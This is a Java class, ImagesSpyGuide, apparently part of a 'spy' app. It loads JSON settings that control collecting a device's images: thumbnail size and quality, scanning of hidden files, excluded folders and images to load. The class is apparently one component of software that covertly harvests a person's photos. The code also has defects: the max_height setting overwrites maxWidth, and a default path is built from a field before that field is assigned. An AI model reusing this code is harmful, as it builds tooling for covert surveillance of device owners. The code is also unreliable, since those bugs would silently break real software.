package com.gameofcoding.spy.guides;

import org.json.JSONObject;
import org.json.JSONArray;
import java.io.File;
import com.gameofcoding.spy.utils.XLog;

public class ImagesSpyGuide implements Guide {
    private static final String TAG = "ImagesSpyGuide";
    private static final String SAVE_IMAGES = "save_images";
    private static final String MAX_WIDTH = "max_width";
    private static final String MAX_HEIGHT = "max_height";
    private static final String IMAGE_QUALITY = "image_quality";
    private static final String SCAN_HIDDEN_FILES = "scan_hidden_files";
    private static final String EXCEPT_FILES = "except_files";
    private static final String IMAGES_TO_BE_LOADED = "images_to_be_loaded";

    private File mRootDir;

    public boolean saveImages = true;
    public int maxWidth = 300;
    public int maxHeight = 300;
    public int imageQuality = 50;
    public boolean scanHiddenFiles = false;
    public File[] exceptFiles = new File[] {
	new File(mRootDir, "Android")
    };
    public File[] imagesToBeLoaded;
    
    public ImagesSpyGuide(File rootDir) {
	try {
	    mRootDir = rootDir;
	    
	    // TODO: Read data from guides file of 'ImagesSpyGuide'
	    String strSpyGuideJson = "{}";
	    JSONObject imageGuide = new JSONObject(strSpyGuideJson);
	    
	    if(imageGuide.has(SAVE_IMAGES))
		saveImages = imageGuide.getBoolean(SAVE_IMAGES);
	    
	    if(imageGuide.has(MAX_WIDTH))
		maxWidth = imageGuide.getInt(MAX_WIDTH);
	    
	    if(imageGuide.has(MAX_HEIGHT))
		maxWidth = imageGuide.getInt(MAX_HEIGHT);
	    
	    if(imageGuide.has(IMAGE_QUALITY))
		imageQuality = imageGuide.getInt(IMAGE_QUALITY);
	    
	    if(imageGuide.has(SCAN_HIDDEN_FILES))
		scanHiddenFiles = imageGuide.getBoolean(SCAN_HIDDEN_FILES);
	    
	    if(imageGuide.has(EXCEPT_FILES)) {
		JSONArray exceptFilesArr = imageGuide.getJSONArray(EXCEPT_FILES);
		exceptFiles = new File[exceptFilesArr.length()];
		for(int i = 0; i < exceptFilesArr.length(); i++)
		    exceptFiles[i] = new File(rootDir, exceptFilesArr.getString(i));
	    }
	    
	    if(imageGuide.has(IMAGES_TO_BE_LOADED)) {
		JSONArray imagesToBeLoadedArr = imageGuide.getJSONArray(IMAGES_TO_BE_LOADED);
		imagesToBeLoaded = new File[imagesToBeLoadedArr.length()];
		for(int i = 0; i < imagesToBeLoadedArr.length(); i++)
		    imagesToBeLoaded[i] = new File(rootDir, imagesToBeLoadedArr.getString(i));
	    }
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occured while loading values from guide json file", e);
	}
    }
}
